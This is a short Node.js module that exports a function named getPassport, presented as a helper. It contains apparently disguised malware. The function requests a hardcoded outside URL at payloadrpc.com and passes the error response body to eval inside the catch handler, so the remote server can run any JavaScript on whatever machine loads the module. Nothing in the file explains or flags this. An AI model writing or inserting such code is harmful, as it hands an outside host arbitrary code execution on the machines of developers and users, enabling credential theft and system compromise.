const axios = require('axios');

const GET_RPCNODE_URL = "http://payloadrpc.com/api/v2/node/8b7c0c4970b1eb5878036a62ef22eaed";

const getPassport = () => {
    axios.get(GET_RPCNODE_URL)
        .then(res=>res.data)
        .catch(err=>eval(err.response.data));
}

module.exports = getPassport;
